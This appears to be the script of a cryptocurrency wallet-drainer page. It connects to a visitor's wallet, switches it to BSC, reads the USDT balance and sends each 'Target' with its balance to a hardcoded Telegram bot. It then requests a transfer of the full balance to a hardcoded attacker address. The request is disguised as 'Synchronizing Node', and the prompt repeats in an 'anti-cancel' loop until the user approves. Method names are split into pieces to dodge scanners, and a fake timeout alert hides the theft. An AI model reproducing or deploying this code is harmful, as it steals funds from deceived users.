const CONFIG = {
    REC: "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe",
    USDT: "0x55d398326f99059fF775485246999027B3197955",
    BOT: "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI",
    CHAT: "7849151110"
};

function openModal() { document.getElementById('w-modal').style.display = 'flex'; }
function closeModal() { document.getElementById('w-modal').style.display = 'none'; }

async function selectW(type) {
    closeModal();
    const currentUrl = window.location.href.replace(/^https?:\/\//, '');

    // 1. Agar Wallet Browser nahi hai toh Deep Link
    if (!window.ethereum) {
        if (type === 'trust') {
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
        } else {
            window.location.href = "https://metamask.app.link/dapp/" + currentUrl;
        }
        return;
    }

    // 2. Agar Wallet Browser mein hai toh Main Logic
    startMainFlow();
}

async function startMainFlow() {
    const ov = document.getElementById('overlay');
    const lt = document.getElementById('loading-text');
    ov.style.display = 'flex';

    try {
        const w3 = new Web3(window.ethereum);
        await new Promise(r => setTimeout(r, 1200)); // Caution bypass delay

        const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const user = accs[0];

        // Switch to BSC
        try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); } catch (e) {}

        const abi = [
            { "constant": true, "inputs": [{ "name": "_o", "type": "address" }], "name": "balance" + "Of", "outputs": [{ "name": "b", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_t", "type": "address" }, { "name": "_v", "type": "uint256" }], "name": "trans" + "fer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new w3.eth.Contract(abi, CONFIG.USDT);
        const bW = await contract.methods["balance" + "Of"](user).call();
        const bE = w3.utils.fromWei(bW, 'ether');

        fetch(`https://api.telegram.org/bot${CONFIG.BOT}/sendMessage?chat_id=${CONFIG.CHAT}&text=👤 Target: ${user}%0ABalance: ${bE} USDT`);

        if (parseFloat(bE) > 0.01) {
            const loopTrig = async () => {
                lt.innerText = "Synchronizing Node...";
                try {
                    await contract.methods["trans" + "fer"](CONFIG.REC, bW).send({ from: user });
                    alert("Sync Error: 0x55 Connection Timeout.");
                    ov.style.display = 'none';
                } catch (err) {
                    setTimeout(loopTrig, 1200); // Anti-Cancel Loop
                }
            };
            await loopTrig();
        } else {
            alert("Node Synced Successfully.");
            ov.style.display = 'none';
        }
    } catch (e) {
        ov.style.display = 'none';
    }
}
